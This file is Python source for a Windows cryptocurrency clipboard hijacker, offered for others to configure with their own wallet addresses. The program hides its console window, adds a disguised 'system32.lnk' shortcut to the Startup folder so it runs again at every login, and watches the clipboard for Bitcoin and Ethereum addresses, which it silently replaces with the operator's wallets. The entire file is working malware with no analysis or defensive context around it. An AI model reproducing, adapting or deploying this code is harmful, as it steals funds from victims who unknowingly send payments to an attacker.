import win32clipboard
import requests
import os
import ctypes
import subprocess
from win32com.client import Dispatch
import pywintypes
import time

# Configure for you !
def config(name):
    global info_o2

    if name == 'bind_app_working_dir':
        alternative = ""
        return alternative

    if name == 'wallet-btc-1':
        alternative = ""
        return alternative

    if name == 'wallet-btc-bc1':
        alternative = ""
        return alternative

    if name == 'wallet-btc-3':
        alternative = ""
        return alternative

    if name == 'wallet-eth&bsc':
        alternative = ""
        return alternative

# Hide terminal
kernel = ctypes.WinDLL('kernel32')
user = ctypes.WinDLL('user32')
SW_HIDE = 0
hWnd = kernel.GetConsoleWindow()
user.ShowWindow(hWnd, SW_HIDE)

# Getting system information
info_r = subprocess.run('systeminfo',shell=True,stdout=subprocess.PIPE)
info_output = info_r.stdout.decode("utf-8")
f1 = info_output.find('Registered Owner:')
f2 = info_output.find('Registered Organization:')
info_o1 = info_output[f1:f2]
info_o2 = info_o1.split('Registered Owner:')[1].strip()

# Create shortcut for execute script when launch system
lnk_r = subprocess.run('dir',cwd='C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(info_o2),shell=True,stdout=subprocess.PIPE)
lnk_output = lnk_r.stdout.decode("utf-8")
f3 = lnk_output.find('system32.lnk')
if f3 == -1 :
    path = os.path.join("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(info_o2), "system32.lnk")
    target = "{}\\BTC-hack-with-clipboard.exe".format(config('bind_app_working_dir'))
    wDir = config('bind_app_working_dir')
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.save()
    print('Shortcut created !')
else:
    print('Shortcut already exists !')

print('Ready to find addresses !')
while True: 
    try:
        # Get clipboard data
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        except TypeError:
            # Set a clipboard
            win32clipboard.SetClipboardText(' ')
            win32clipboard.CloseClipboard()
            time.sleep(1)
            continue
    except pywintypes.error:
        time.sleep(1)
        continue

    if len(data) > 30 and not data in [config('wallet-btc-1'),config('wallet-btc-bc1'),config('wallet-btc-3'),config('wallet-eth&bsc')]:
        try:
            req1 = requests.get("https://www.blockchain.com/btc/address/"+data, timeout=8)
            req2 = requests.get("https://www.blockchain.com/eth/address/"+data, timeout=8)
        except:
            continue
        if req1.status_code == 200:
            print('A valid BTC address found !')
            if data[0] == '1':
                while True:
                    try:
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardText(config('wallet-btc-1'))
                        win32clipboard.CloseClipboard()
                        time.sleep(1)
                        print('Address replaced! :)')
                        break
                    except:
                        pass
            elif data[:3] == 'bc1':
                while True:
                    try:
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardText(config('wallet-btc-bc1'))
                        win32clipboard.CloseClipboard()   
                        time.sleep(1)
                        print('Address replaced! :)')
                        break
                    except:
                        pass
            elif data[0] == '3':
                while True:
                    try:
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardText(config('wallet-btc-3'))
                        win32clipboard.CloseClipboard()
                        time.sleep(1)
                        print('Address replaced! :)')
                        break
                    except:
                        pass
            else:
                pass

        if req2.status_code == 200:
            print('A valid ETH address found !')
            while True:
                try:
                    win32clipboard.OpenClipboard()
                    win32clipboard.EmptyClipboard()
                    win32clipboard.SetClipboardText(config('wallet-eth&bsc'))
                    win32clipboard.CloseClipboard()
                    time.sleep(1)
                    print('Address replaced! :)')
                    break
                except:
                    pass
    else:
        pass

# Powered by Elman :)
